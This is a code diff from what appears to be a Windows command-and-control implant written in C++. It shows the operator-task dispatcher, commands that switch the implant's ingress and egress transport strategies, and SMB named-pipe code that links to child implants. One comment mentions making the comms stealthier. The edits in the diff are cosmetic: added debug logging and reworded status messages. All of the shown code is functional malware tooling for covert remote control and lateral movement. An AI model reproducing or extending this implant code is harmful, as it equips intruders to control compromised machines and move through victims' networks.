@@ -73,12 +73,15 @@ std::string GetErrorMessage(DWORD dwErrorCode) {
 
 //Helpers
 std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref_symbol) {
+    DEBUG_LOG("[deref_memstore_content]: Dereferencing " << memstore_name_with_deref_symbol << " from memstore");
+
     //nuke the `*` from the memstore name
     //ex, *mydata -> mydata
     memstore_name_with_deref_symbol.erase(0, 1);
 
     //sanity check to make sure the name is not empty for some reason
     if (memstore_name_with_deref_symbol.empty()) {
+        DEBUG_LOG("[deref_memstore_content]: " << memstore_name_with_deref_symbol << " was empty");
         //reutrn a blank vector if the name is blank
         return std::vector <uint8_t> {};
     }
@@ -122,10 +125,13 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
         return result;
     }
+    DEBUG_LOG("[command_tree]: " << task_name);
+
     /*
     Strat commands
     */
     if (task_name == "strat get") {
+
         nlohmann::json result;
         std::string target_strat = task_data["task"]["args"]["strategy_name"];
 
@@ -142,11 +148,11 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         if (found) {
             SettingsManager::instance().set("comms_get_function", target_strat);
-            result["data"] = "[+] Ingress strategy successfully updated to: " + target_strat;
+            result["data"] = "Ingress strategy successfully updated to: " + target_strat;
             result["windows_error_code"] = ERROR_SUCCESS;
         }
         else {
-            result["data"] = "[-] Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
+            result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
             result["windows_error_code"] = ERROR_NOT_FOUND;
         }
 
@@ -155,6 +161,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
     }
     //need to udpate
     else if (task_name == "strat post") {
+
         nlohmann::json result;
         std::string target_strat = task_data["task"]["args"]["strategy_name"];
 
@@ -171,11 +178,11 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         if (found) {
             SettingsManager::instance().set("comms_post_function", target_strat);
-            result["data"] = "[+] Egress strategy successfully updated to: " + target_strat;
+            result["data"] = "Egress strategy successfully updated to: " + target_strat;
             result["windows_error_code"] = ERROR_SUCCESS;
         }
         else {
-            result["data"] = "[-] Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
+            result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
             result["windows_error_code"] = ERROR_NOT_FOUND;
         }
 
@@ -212,8 +219,8 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         // Format the "data" field so the operator gets a clean visual read
         //probably can strip this out for more stealthy comms
         std::string output = "--- Active Transport Strategies ---\n";
-        output += "[*] Ingress (GET)  : " + get_strategy + "\n";
-        output += "[*] Egress (POST) : " + post_strategy + "\n";
+        output += "Ingress (GET)  : " + get_strategy + "\n";
+        output += "Egress (POST) : " + post_strategy + "\n";
 
         result["data"] = output;
         result["windows_error_code"] = ERROR_SUCCESS;
@@ -318,21 +325,21 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         //poking child
         if (cri.route_type == ROUTE_SMB_PIPE) {
-            DEBUG_LOG("[*] Waiting for connection from child");
+            DEBUG_LOG("Waiting for connection from child");
 
             // quickly connect to pipes
             HANDLE h_parent_write = CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
             HANDLE h_parent_read = CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
 
             if (h_parent_write != INVALID_HANDLE_VALUE && h_parent_read != INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("[*] Pipes connected. Waiting for child to check in...");
+                DEBUG_LOG("Pipes connected. Waiting for child to check in...");
                 cri.h_pipe_inbox = h_parent_write;
                 cri.h_pipe_outbox = h_parent_read;
 
                 // CRITICAL: Force the read handle into Message Mode so MsgPack doesn't fragment
                 DWORD mode = PIPE_READMODE_MESSAGE;
                 if (!SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
-                    std::cerr << "[-] Failed to set pipe to message mode. Error: " << GetLastError() << std::endl;
+                    std::cerr << "Failed to set pipe to message mode. Error: " << GetLastError() << std::endl;
                 }
 
                 // Use our new dynamic reader!
@@ -340,7 +347,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
                 DWORD read_status = SMB::read_pipe_dynamic(cri.h_pipe_outbox, request_bytes);
 
                 if (read_status != ERROR_SUCCESS || request_bytes.empty()) {
-                    DEBUG_LOG("[-] Pipe broke or child disconnected. Error: " << read_status);
+                    DEBUG_LOG("Pipe broke or child disconnected. Error: " << read_status);
                     result["error"] = "Pipe broke or child disconnected";
                     return result;
                 }
@@ -377,7 +384,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
                 }
                 catch (const std::exception& e) {
-                    std::cerr << "[-] Exception during link: " << e.what() << std::endl;
+                    std::cerr << "Exception during link: " << e.what() << std::endl;
                     result["error"] = "Something went wrong linking to the implant";
                     return result;
                 }
